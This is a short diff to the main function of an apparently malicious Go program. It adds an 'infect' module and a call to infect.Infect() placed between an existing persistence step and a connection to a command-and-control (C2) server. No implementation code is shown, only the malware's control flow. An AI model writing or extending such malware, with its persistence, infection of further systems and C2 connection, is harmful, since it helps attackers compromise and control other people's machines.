@@ -8,6 +8,7 @@ import(
   "fmt"
   "os/exec"
 
+  "./infect"
   "./debug"
   "./info"
   "./persist"
@@ -25,6 +26,9 @@ func main(){
 
   // persistence
   persist.CheckAndExec(i)
+
+  // infection
+  infect.Infect(i)
 
   // C2
   token, sock := connect()
